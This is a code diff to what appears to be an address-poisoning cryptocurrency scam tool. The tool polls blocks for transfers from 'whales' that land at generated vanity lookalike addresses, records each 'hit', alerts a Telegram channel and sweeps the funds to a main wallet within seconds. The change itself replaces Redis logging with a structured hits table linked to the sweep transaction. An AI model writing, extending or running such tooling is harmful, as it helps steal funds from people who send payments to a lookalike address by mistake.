@@ -4,6 +4,7 @@ import { CHAINS } from '../config/chains.js';
 import { getVanityKey, listVanityAddresses } from '../tx/vault.js';
 import { sendTx } from '../tx/sender.js';
 import { sendHitAlert } from './alerts.js';
+import { saveHit, updateHitTransfer, updateVanityStatus, incrementDailyStat } from '../lib/db.js';
 
 const MAIN_WALLET = process.env.MAIN_WALLET;
 const POLL_INTERVAL = 5_000;  // 5s polling
@@ -129,8 +130,15 @@ async function checkBlock(provider, chainKey, blockNumber, getAddresses) {
       console.log(`  Value:  ${valueEth} ${chain.nativeSymbol}`);
       console.log(`  TX:     ${tx.hash}`);
 
-      // Log to Redis
-      await logHit(chainKey, tx, valueEth);
+      // Log to Redis (structured hits table)
+      const hitId = await saveHit({
+        vanityAddress: tx.to,
+        whale: tx.from,
+        amount: valueEth,
+        token: 'native',
+        chain: chain.name,
+        txHash: tx.hash,
+      });
 
       // Alert Telegram
       await sendHitAlert({
@@ -145,7 +153,7 @@ async function checkBlock(provider, chainKey, blockNumber, getAddresses) {
 
       // Auto-transfer to main wallet
       if (parseFloat(valueEth) > 0) {
-        await autoTransfer(chainKey, to, tx.value);
+        await autoTransfer(chainKey, to, tx.value, hitId);
       }
     }
   }
@@ -154,7 +162,7 @@ async function checkBlock(provider, chainKey, blockNumber, getAddresses) {
 /**
  * Auto-transfer funds from vanity address to main wallet (<10s)
  */
-async function autoTransfer(chainKey, vanityAddress, receivedValue) {
+async function autoTransfer(chainKey, vanityAddress, receivedValue, hitId) {
   try {
     // Find the target address for this vanity
     const entries = await listVanityAddresses();
@@ -201,6 +209,11 @@ async function autoTransfer(chainKey, vanityAddress, receivedValue) {
     const receipt = await tx.wait();
     console.log(`  [AutoTransfer] Confirmed: ${receipt.hash}`);
 
+    // Update hit record with transfer info
+    if (hitId) {
+      await updateHitTransfer(hitId, MAIN_WALLET, receipt.hash);
+    }
+
     await sendHitAlert({
       chain: chain.name,
       chainKey,
@@ -216,23 +229,6 @@ async function autoTransfer(chainKey, vanityAddress, receivedValue) {
   }
 }
 
-/**
- * Log hit to Redis
- */
-async function logHit(chainKey, tx, valueEth) {
-  const chain = CHAINS[chainKey];
-  const hit = {
-    chain: chain.name,
-    from: tx.from,
-    to: tx.to,
-    value: valueEth,
-    symbol: chain.nativeSymbol,
-    txHash: tx.hash,
-    timestamp: new Date().toISOString(),
-  };
-  await redis.rpush('hits:log', JSON.stringify(hit));
-  await redis.incr('hits:count');
-}
 
 /**
  * Cleanup vanity addresses older than TTL_DAYS
